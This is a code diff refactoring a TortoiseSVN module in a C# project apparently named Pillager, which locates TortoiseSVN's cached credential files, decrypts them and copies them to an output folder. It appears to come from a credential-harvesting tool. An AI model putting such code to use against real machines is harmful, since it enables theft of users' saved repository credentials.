@@ -1,17 +1,14 @@
-﻿using System;
-using System.Collections.Generic;
+﻿using Pillager.Helper;
+using System;
 using System.IO;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
 namespace Pillager.Tools
 {
-    internal class TortoiseSVN
+    internal class TortoiseSVN : ICommand
     {
-        public static string ToolName = "TortoiseSVN";
-
-        public static string Decrypt(string input)
+        public string Decrypt(string input)
         {
             try
             {
@@ -24,7 +21,7 @@ namespace Pillager.Tools
             }
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
@@ -32,7 +29,7 @@ namespace Pillager.Tools
                 if (!Directory.Exists(folder)) return;
                 string[] files = Directory.GetFiles(folder, new String('?', 32));
                 if (files.Length == 0) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "TortoiseSVN");
                 Directory.CreateDirectory(savepath);
                 foreach (string file in files)
                 {
